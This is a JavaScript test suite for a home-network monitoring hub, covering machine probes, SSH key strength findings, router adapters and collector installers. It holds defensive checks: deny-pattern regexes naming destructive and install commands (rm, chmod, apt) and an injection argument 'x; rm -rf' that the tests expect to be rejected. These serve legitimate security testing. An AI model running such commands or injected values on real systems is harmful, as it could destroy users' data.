 assert.equal((await readFile(path.join(outDir,'history.jsonl'),'utf8')).trim().split('\n').length,1);
 // Second run: the mini is unreachable. Its last record stays, marked stale; the others are fresh.
 const second=fakeExec({local:macProbe,'nas-admin':nasProbe,mini:{error:'ssh: Could not resolve hostname mini'}});
 const r2=await collectSystems({site:SITE,registry,outDir,exec:second.exec,now:()=>'2026-11-08T18:00:00.000Z',collectedFrom:'collector'});
 const mini=r2.snapshot.machines.mini;assert.equal(mini.stale,true);assert.equal(mini.complete,true);assert.equal(mini.os.version,'26.7.1');assert.match(mini.lastError,/Could not resolve/);assert.equal(mini.lastAttemptAt,'2026-11-08T18:00:00.000Z');
 assert.equal(r2.doc.machines.find(m=>m.id==='mini').stale,true);assert.equal(r2.snapshot.machines.studio.stale,false);
 assert.equal((await readFile(path.join(outDir,'history.jsonl'),'utf8')).trim().split('\n').length,2);
 assert.deepEqual(await probeMachine('x',macProbe,async()=>({code:1,stdout:'HOST\tx\n',stderr:'boom\nlast line'})),{error:'last line'},'a probe that did not finish is an error, never half a record');
});

test('macOS probe reads the boot time, not its microseconds; an old snapshot with a decades-long uptime is not shown',()=>{
 const src=readFileSync(path.join(root,'scripts','systems','mac-probe.sh'),'utf8'),expr=/kern\.boottime 2>\/dev\/null \| sed -n '([^']+)'/.exec(src)[1];
 const sed=line=>spawnSync('sed',['-n',expr],{input:line+'\n',encoding:'utf8'}).stdout.trim();
 assert.equal(sed('{ sec = 1793827174, usec = 338775 } Wed Nov  4 22:19:34 2026'),'1793827174');assert.equal(sed('garbage'),'');
 const parse=uptime=>parseSystemsProbe(['HOST\tmini\tDarwin\tu\t0\t2026-11-08T12:00:00Z',`UPTIME\t${uptime}`,'END\tok'].join('\n'));
 assert.equal(parse(String(Date.parse('2026-11-08T12:00:00Z')/1000-7200)).uptimeSeconds,7200);assert.equal(parse('').uptimeSeconds,null,'an empty field is not "booted in 1970"');
 const shown=s=>buildSystems({snapshot:{machines:{mini:{...parse('1'),uptimeSeconds:s}}},upstream:null,registry:{items:[]},machines:[{id:'mini',name:'Mac mini',kind:'mac'}]}).machines[0].uptimeSeconds;
 assert.equal(shown(1794143567),null);assert.equal(shown(86400),86400);
});

test('probes are read-only: nothing installs, upgrades or changes a probed machine',()=>{
 for(const file of ['scripts/systems/mac-probe.sh','scripts/systems/nas-probe.sh','scripts/security/ssh-probe.sh']){
  const src=readFileSync(path.join(root,file),'utf8').split('\n').filter(l=>!/^\s*#/.test(l)).join('\n');
  assert.doesNotMatch(src,/brew\s+(update|upgrade|install|uninstall|cleanup)\b/,file);
  assert.doesNotMatch(src,/softwareupdate\s+(-i|--install|-d|--download)/,file);
  assert.doesNotMatch(src,/\b(rm|mv|cp|chmod|chown|tee|launchctl (load|unload|bootstrap|bootout|kickstart|remove)|defaults write|systemctl (?!is-active\b)\S+|apt(-get)?|pip3? install)\b/,file);
  assert.doesNotMatch(src,/midclt call \S*\.(update|upgrade|run|download|create|delete|set|start|stop|restart)\b/,file);
  assert.equal(spawnSync('/bin/sh',['-n',path.join(root,file)]).status,0,file);
 }
});

const KEY_A='SHA256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',KEY_R='SHA256:rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr';
const keysProbe=name=>[rec('HOST',name,'Darwin','alice','1','2026-11-08T12:00:00Z'),rec('NET','10.0.0.151'),rec('LISTEN','on'),rec('SSHD','passwordauthentication','no'),
 rec('USER','alice','501','/Users/alice','/bin/zsh','1'),rec('SUDO','alice','none',''),
 rec('KEY','/Users/alice/.ssh/id_ed25519','600','alice','1793480361','OPENSSH','yes',`256 ${KEY_A} laptop (ED25519)`),
 rec('KEY','/Users/alice/.ssh/id_rsa','600','alice','1262304000','OPENSSH','no',`1024 ${KEY_R} ancient (RSA)`),rec('END','ok')].join('\n');
test('collect-security with a stubbed runner: one probe per machine, the router is only port-checked, weak keys become findings',async t=>{
 const out=path.join(await tmp(t),'security','ssh-keys.json');
 const {exec,calls}=fakeExec({mini:keysProbe('mini'),local:keysProbe('studio'),mini_server:keysProbe('mini_server'),'nas-admin':{error:'Permission denied (publickey).'}});
 const ports=[];
 const doc=await collectSecurity({site:SITE,out,exec,forgejo:false,portOpen:async(host,port)=>{ports.push([host,port]);return false;},now:Date.parse('2026-11-08T12:00:00Z'),machinesDir:path.join(path.dirname(out),'none')});
 assert.deepEqual(calls.filter(c=>c[0]==='ssh').map(c=>c.at(-2)).sort(),['mini','mini_server','nas-admin']);assert.ok(calls.every(c=>['ssh','/bin/sh','hostname'].includes(c[0])),'no tea, no other command');
 assert.deepEqual(ports,[['10.0.0.1',22]]);
 assert.deepEqual(doc.machines.map(m=>[m.id,m.reachable]),[['studio',true],['mini',true],['mini_server',true],['nas',false],['router',false]]);
 assert.equal(doc.machines.find(m=>m.id==='router').sshOpen,false);assert.match(doc.machines.find(m=>m.id==='nas').error,/Permission denied/);
 assert.equal(doc.collectedFrom,'collector');assert.deepEqual(JSON.parse(await readFile(out,'utf8')),doc);assert.equal((await stat(out)).mode&0o777,0o600);
 const weak=doc.findings.find(f=>/slabý typ klíče/.test(f.title));
 assert.equal(weak.level,'warn');assert.equal(weak.title,'id_rsa (ancient): slabý typ klíče (RSA 1024)');
 assert.deepEqual(weak.titleT,[{key:'{key}: slabý typ klíče ({type})',params:{key:'id_rsa (ancient)',type:'RSA 1024'}}]);
 const copies=doc.findings.find(f=>f.key===KEY_A&&/kopie/.test(f.title));assert.equal(copies.title,'id_ed25519 (laptop): 3 kopie');assert.equal(copies.titleT[0].params.n,3);
 assert.doesNotMatch(JSON.stringify(doc),/BEGIN [A-Z ]*PRIVATE KEY/);
});

test('key strength: DSA and short RSA or ECDSA are weak, RSA under 3072 is legacy; the page applies the same rule',async()=>{
 const cases=[['ED25519',256,'ok'],['ED25519-SK',256,'ok'],['RSA',1024,'weak'],['RSA',2048,'legacy'],['RSA',3072,'ok'],['RSA',4096,'ok'],['DSA',1024,'weak'],['ECDSA',256,'ok'],['ECDSA',224,'weak'],['ECDSA-SK',256,'ok'],[null,null,null],['',0,null]];
 const view=await import('../public/security-view.js');
 for(const [type,bits,want] of cases){assert.equal(keyStrength(type,bits),want,`${type} ${bits}`);assert.equal(view.keyStrength(type,bits),want,`view ${type} ${bits}`);}
 const now=Date.parse('2026-11-08T00:00:00Z'),key=(type,bits,...copies)=>({type,bits,copies});
 const copy=(mtime,backup=false)=>({mtime,backup});
 assert.deepEqual(view.keyHealth(key('ED25519',256,copy('2026-10-09T00:00:00Z')),now),{strength:'ok',ageDays:30,old:false,level:''});
 assert.equal(view.keyHealth(key('ED25519',256,copy('2023-01-01T00:00:00Z')),now).level,'warn','older than two years');
 assert.equal(view.keyHealth(key('RSA',1024,copy('2026-10-09T00:00:00Z')),now).level,'bad');assert.equal(view.keyHealth(key('RSA',2048,copy('2026-10-09T00:00:00Z')),now).level,'warn');
 assert.equal(view.keyHealth(key('ED25519',256,copy('2020-01-01T00:00:00Z',true),copy('2026-10-09T00:00:00Z')),now).ageDays,30,'a backup copy does not date the key');
 assert.deepEqual(view.keyHealth(key(null,null),now),{strength:null,ageDays:null,old:false,level:''});
});

const observation=(over={})=>({schemaVersion:1,status:'ok',observedAt:'2026-11-08T11:59:30Z',attemptedAt:'2026-11-08T11:59:30Z',error:null,model:'UniFi Dream Router 7 (UDR7)',firmware:'4.3.6',routerMac:'A8:9C:6C:0E:8D:15',
 source:'UniFi Network API',backend:'integration-api',applicationVersion:'9.4.19',clientCounts:{wired:1,wireless:1,other:0},knownClients:{'aa:bb:cc:dd:ee:01':{},'aa:bb:cc:dd:ee:02':{},'aa:bb:cc:dd:ee:03':{}},
 unifiDevices:[{name:'Gateway',model:'UDR7',mac:'a8:9c:6c:0e:8d:15',ip:'10.0.0.1',state:'ONLINE',firmware:'4.3.6'},{name:'Switch',model:'USW',mac:'',ip:'10.0.0.2',state:'OFFLINE',firmware:'7.1'}],
 devices:[{mac:'AA:BB:CC:DD:EE:01',ip:'10.0.0.151',name:'Desktop',connection:'Ethernet',presence:'reachable'},{mac:'aa:bb:cc:dd:ee:02',ip:'10.0.0.77',name:'Phone',connection:'Wi-Fi · 5 GHz',presence:'associated'},
  {mac:'aa:bb:cc:dd:ee:03',ip:'10.9.0.5',name:'VPN',connection:'Ethernet',presence:'reachable'},{mac:'nope',ip:'10.0.0.9',name:'Broken'},{mac:'aa:bb:cc:dd:ee:04',ip:'10.0.0.255',name:'Broadcast'}],...over});
test('router adapter: one contract (census + health), five states, and the fields the overview always read',()=>{
 const now=Date.parse('2026-11-08T12:00:00Z'),lanCidrs=['10.0.0.0/24'],unifi=ROUTER_ADAPTERS.unifi;
 const none=normalizeRouter(null,{lanCidrs,now});
 assert.deepEqual({status:none.status,state:none.state,adapter:none.adapter,devices:none.devices,health:none.health,freshness:none.freshness},{status:'not-configured',state:'not-configured',adapter:null,devices:[],health:null,freshness:'unknown'});
 assert.equal(normalizeRouter(null,{lanCidrs,now,adapter:unifi}).state,'waiting');assert.equal(normalizeRouter(null,{lanCidrs,now,adapter:unifi}).status,'not-configured','older clients read this as "no feed"');
 const ok=normalizeRouter(observation(),{lanCidrs,now,adapter:unifi});
 assert.deepEqual({status:ok.status,state:ok.state,freshness:ok.freshness,observedAt:ok.observedAt,model:ok.model,firmware:ok.firmware,routerMac:ok.routerMac,error:ok.error},
  {status:'ok',state:'ok',freshness:'fresh',observedAt:'2026-11-08T11:59:30Z',model:'UniFi Dream Router 7 (UDR7)',firmware:'4.3.6',routerMac:'a8:9c:6c:0e:8d:15',error:null});
 assert.deepEqual(ok.adapter,{id:'unifi',title:'UniFi Network'});
 assert.deepEqual(ok.devices,[{mac:'aa:bb:cc:dd:ee:01',id:'aabbccddee01',ip:'10.0.0.151',name:'Desktop',connection:'Ethernet',presence:'reachable'},{mac:'aa:bb:cc:dd:ee:02',id:'aabbccddee02',ip:'10.0.0.77',name:'Phone',connection:'Wi-Fi · 5 GHz',presence:'associated'}],
  'only well-formed clients with a host address inside the site networks');
 assert.deepEqual(ok.health.clients,{connected:2,wired:1,wireless:1,other:0,known:3});assert.equal(ok.health.status,'degraded','a piece of network hardware is offline');assert.equal(ok.health.hardwareDown,1);
 assert.deepEqual(ok.health.hardware[0],{name:'Gateway',model:'UDR7',state:'ONLINE',firmware:'4.3.6',ip:'10.0.0.1'});assert.equal(ok.health.softwareVersion,'9.4.19');
 assert.equal(normalizeRouter(observation({unifiDevices:[{name:'Gateway',state:'online'}]}),{lanCidrs,now,adapter:unifi}).health.status,'ok');
 const stale=normalizeRouter(observation({observedAt:'2026-11-08T11:50:00Z'}),{lanCidrs,now,adapter:unifi});assert.equal(stale.state,'stale');assert.equal(stale.freshness,'stale');assert.equal(stale.status,'ok');assert.equal(stale.health.status,'unknown');
 const failed=normalizeRouter(observation({status:'unavailable',error:'certificate-changed'}),{lanCidrs,now,adapter:unifi});
 assert.equal(failed.state,'unavailable');assert.equal(failed.error,'certificate-changed');assert.equal(failed.devices.length,2,'the last census is kept, never shown as "no clients"');
 assert.equal(normalizeRouter(observation(),{lanCidrs:[],now,adapter:unifi}).devices.length,4,'no networks configured: any IPv4 address');
 // Hostile or broken input is bounded.
 const junk=normalizeRouter({status:'ok',observedAt:'x',devices:'no',unifiDevices:[null,{name:'<b>'.repeat(100),state:5}],model:{},clientCounts:{wired:-1,wireless:'9'},knownClients:[]},{lanCidrs,now,adapter:unifi});
 assert.equal(junk.freshness,'unknown');assert.deepEqual(junk.devices,[]);assert.equal(junk.model,'');assert.equal(junk.health.hardware[0].name.length,80);assert.deepEqual(junk.health.clients,{connected:0,wired:0,wireless:0,other:0,known:0});
});

test('router adapter: site.json names it, a plugin can provide one, a hub with an observation file keeps working; GET /api/router',async t=>{
 const dir=await tmp(t),now=Date.parse('2026-11-08T12:00:00Z');
 const fake=(site,provided)=>({site:validateSite(site),directory:dir,provided:name=>name==='router.adapter'?provided:undefined});
 assert.equal(await routerAdapter(fake({})),null);assert.equal((await readRouterFor(fake({}),{now})).state,'not-configured');
 assert.equal((await routerAdapter(fake({router:{adapter:'unifi',host:'10.0.0.1',site:'default'}}))).id,'unifi');
 assert.equal((await readRouterFor(fake({router:{adapter:'unifi'}}),{now})).state,'waiting','configured, nothing written yet');
 const unknown=await readRouterFor(fake({router:{adapter:'mikrotik'}}),{now});assert.equal(unknown.state,'waiting');assert.equal(unknown.error,'unknown-adapter');
 // A plugin's adapter: its own read, the same normalization and LAN filter.
 const plugin={id:'mikrotik',title:'MikroTik',staleAfterSeconds:900,read:async({site})=>observation({observedAt:'2026-11-08T11:50:00Z',hardware:[{name:'hEX',model:'RB750',state:'ONLINE'}],unifiDevices:undefined,note:site.lanCidrs[0]})};
 const viaPlugin=await readRouterFor(fake({lanCidrs:['10.0.0.0/24'],router:{adapter:'mikrotik'}},plugin),{now});
 assert.deepEqual(viaPlugin.adapter,{id:'mikrotik',title:'MikroTik'});assert.equal(viaPlugin.state,'ok','its own staleness limit');assert.equal(viaPlugin.devices.length,2);assert.equal(viaPlugin.health.hardware[0].name,'hEX');
 assert.equal((await readRouterFor(fake({},plugin),{now})).adapter.id,'mikrotik','a provided adapter needs no site setting');
 assert.equal((await routerAdapter(fake({router:{adapter:'unifi'}},plugin))).id,'unifi','site.json decides when both exist');
 assert.equal((await readRouterFor(fake({},{id:'broken',read:async()=>{throw new Error('boom');}}),{now})).state,'unavailable');
 assert.equal(await routerAdapter(fake({},{id:'x'})),null,'something that is not an adapter is ignored');
 // The file adapter without any setting: what a hub from before the adapter contract has.
 await writeFile(path.join(dir,ROUTER_FILE),JSON.stringify(observation()));
 assert.equal((await routerAdapter(fake({}))).id,'unifi');assert.equal((await readRouterFor(fake({lanCidrs:['10.0.0.0/24']}),{now})).state,'ok');
 const legacy=await readRouter(dir,{lanCidrs:['10.0.0.0/24'],now});assert.equal(legacy.status,'ok');assert.equal(legacy.devices.length,2);assert.equal((await readRouter(path.join(dir,'missing'))).status,'not-configured');
 for(const bad of [{adapter:'UniFi'},{adapter:'unifi',host:'bad host'},{adapter:'unifi',site:'../x'},{adapter:'unifi',key:'secret'},{}])assert.throws(()=>validateSite({router:bad}),/site config: router/,JSON.stringify(bad));
 assert.equal(validateSite({}).router,null);
 // Over HTTP: every signed-in account may read it; the overview payload still carries its router summary.
 const h=await hub(t);
 assert.equal((await fetch(h.origin+'/api/router')).status,401);
 const empty=await (await fetch(h.origin+'/api/router',{headers:h.admin})).json();
 assert.equal(empty.state,'not-configured');assert.deepEqual(empty.configured,{adapter:null,host:'10.0.0.1',lanCidrs:['10.0.0.0/24']});assert.deepEqual(empty.machine,{id:'router',name:'Router',ip:'10.0.0.1'});
 assert.equal((await (await fetch(h.origin+'/api/home',{headers:h.admin})).json()).router.status,'not-configured');
 await writeFile(path.join(h.dir,ROUTER_FILE),JSON.stringify(observation({observedAt:new Date().toISOString()})));
 const live=await (await fetch(h.origin+'/api/router',{headers:(await h.account('reader',[])).headers})).json();
 assert.equal(live.state,'ok');assert.equal(live.devices.length,2);assert.equal(live.adapter.id,'unifi');
 const home=await (await fetch(h.origin+'/api/home',{headers:h.admin})).json();
 assert.deepEqual({status:home.router.status,freshness:home.router.freshness,clients:home.router.clients,model:home.router.model},{status:'ok',freshness:'fresh',clients:2,model:'UniFi Dream Router 7 (UDR7)'});
 assert.equal(home.machines.find(m=>m.id==='router').online,'online');assert.deepEqual(home.machines.find(m=>m.id==='router').quad,{clients:2,wifi:1,power:null,temp:null});
});

test('collectors with nothing configured say what to add, exit cleanly and write nothing',async t=>{
 const dir=await tmp(t),env={...process.env,HOME_HUB_SITE_CONFIG:'none',DATA_DIR:path.join(dir,'data'),SOFTWARE_WATCH_FILE:path.join(dir,'missing.json'),SYSTEMS_DIR:''};
 delete env.SYSTEMS_DIR;
 for(const [script,pattern] of [['collect-systems.mjs',/No machine to probe yet\. Nothing was written\.[\s\S]*local\/site\.json[\s\S]*install-launchd\.sh[\s\S]*examples\/systemd/],
  ['collect-security.mjs',/No machine to read SSH keys from yet\. Nothing was written\./],['check-upstream.mjs',/No software watch list yet .*no upstream to check\. Nothing was written\.[\s\S]*software_watch_put/]]){
  const r=spawnSync(process.execPath,[path.join(root,'scripts',script)],{env,encoding:'utf8',timeout:20000});
  assert.equal(r.status,0,`${script}: ${r.stderr}`);assert.match(r.stdout,pattern,script);
 }
 assert.deepEqual(await readdir(dir),[],'no data directory, no snapshot');
 assert.match(NOTHING_TO_PROBE,/"probe": "mac"/);
});

test('launchd installer: --print installs nothing; neutral labels by default, a given prefix keeps existing jobs; systemd examples match',async()=>{
 const script=path.join(root,'scripts','systems','install-launchd.sh'),home=await mkdtemp(path.join(os.tmpdir(),'hub-home-'));
 try{
  const print=(...args)=>spawnSync('/bin/sh',[script,'--print',...args],{encoding:'utf8',env:{PATH:'/usr/bin:/bin:/usr/sbin:/sbin',HOME:home}});
  const labels=out=>[...out.matchAll(/<key>Label<\/key><string>([^<]+)<\/string>/g)].map(m=>m[1]);
  const plain=print();assert.equal(plain.status,0,plain.stderr);
  assert.deepEqual(labels(plain.stdout),['local.home-hub.systems-collect','local.home-hub.systems-upstream']);
  assert.deepEqual([...plain.stdout.matchAll(/<key>StartInterval<\/key><integer>(\d+)<\/integer>/g)].map(m=>Number(m[1])),[COLLECTORS.systems.intervalSeconds,COLLECTORS.upstream.intervalSeconds]);
  assert.match(plain.stdout,/scripts\/collect-systems\.mjs<\/string>\s*<string>--data<\/string>/);
  const prefixed=print('--label-prefix','com.example.hub-v2','--with-security','--data','/srv/hub & data');
  assert.deepEqual(labels(prefixed.stdout),['com.example.hub-v2.systems-collect','com.example.hub-v2.systems-upstream','com.example.hub-v2.security-collect']);
  assert.match(prefixed.stdout,/<string>\/srv\/hub &amp; data<\/string>/);assert.match(prefixed.stdout,/<integer>86400<\/integer>/);
  assert.equal(print('--label-prefix','x; rm -rf').status,2);assert.equal(print('--nonsense').status,2);
  assert.deepEqual(await readdir(home),[],'print mode writes no property list and creates no directory');
 }finally{await rm(home,{recursive:true,force:true});}
 assert.equal(spawnSync('/bin/sh',['-n',script]).status,0);
 const dir=path.join(root,'examples','systemd'),seconds={h:3600,min:60};
 for(const [unit,file,name] of [['systems-collect','collect-systems.mjs','systems'],['systems-upstream','check-upstream.mjs','upstream'],['security-collect','collect-security.mjs','security']]){
  const service=await readFile(path.join(dir,`home-hub-${unit}.service`),'utf8'),timer=await readFile(path.join(dir,`home-hub-${unit}.timer`),'utf8');
  assert.match(service,new RegExp(`ExecStart=/usr/bin/env node scripts/${file.replace('.','\\.')} --data `));assert.match(service,/Type=oneshot/);
  const [,n,u]=/OnUnitActiveSec=(\d+)(h|min)/.exec(timer);assert.equal(Number(n)*seconds[u],COLLECTORS[name].intervalSeconds,unit);assert.match(timer,/WantedBy=timers\.target/);
 }
 assert.match(await readFile(path.join(dir,'README.md'),'utf8'),/systemctl --user enable --now home-hub-systems-collect\.timer/);
});

test('sentences the server builds: the Czech text clients know, its parts, and English for every template',async()=>{
 assert.equal(fill('{a} a {b} a {c}',{a:1,b:['x','y']}),'1 a x, y a {c}');
 assert.deepEqual(tx('Portů: {n}',{n:2},'2 portů'),{text:'2 portů',parts:[{key:'Portů: {n}',params:{n:2}}]});
 assert.deepEqual(sentences('Jedna.',null,tx('Dvě {n}.',{n:2})),{text:'Jedna. Dvě 2.',parts:[{key:'Jedna.',params:{}},{key:'Dvě {n}.',params:{n:2}}]});
 assert.deepEqual(field('note','plain'),{note:'plain'});assert.deepEqual(field('note',null),{note:null});assert.deepEqual(Object.keys(field('note',tx('a {b}',{b:1}))),['note','noteT']);
 globalThis.localStorage??={getItem:()=>null,setItem:()=>{}};
 const {dictionary}=await import('../public/i18n.js');
 const holes=s=>[...String(s).matchAll(/\{(\w+)\}/g)].map(m=>m[1]).sort().join(',');
 // Every Czech string literal in the modules that build the payloads (labels, values, details, findings, notes).
 const missing=[];let seen=0;
 for(const file of ['server/systems-data.mjs','server/security-data.mjs','scripts/collect-security.mjs','server/core/security.mjs','server/core/router.mjs']){
  const src=readFileSync(path.join(root,file),'utf8').split('\n').filter(l=>!/^\s*(\/\/|\*|\/\*)/.test(l)).join('\n');
  for(const m of src.matchAll(/'((?:[^'\\\n]|\\.)*[áčďéěíňóřšťúůýžÁČĎÉĚÍŇÓŘŠŤÚŮÝŽ](?:[^'\\\n]|\\.)*)'/g)){
   const key=m[1].replace(/\\'/g,"'");if(key.includes('`')||key.includes('${'))continue;// a piece of a template literal, not a string
   seen++;
   if(!Object.hasOwn(dictionary,key))missing.push(`${file}: ${key}`);else assert.equal(holes(dictionary[key]),holes(key),`${file}: placeholders differ: ${key}`);
  }
 }
 assert.ok(seen>120,String(seen));assert.deepEqual(missing,[]);
 for(const id of ['software:write'])for(const text of [SCOPES[id].label,SCOPES[id].desc])assert.ok(dictionary[text],text);
});
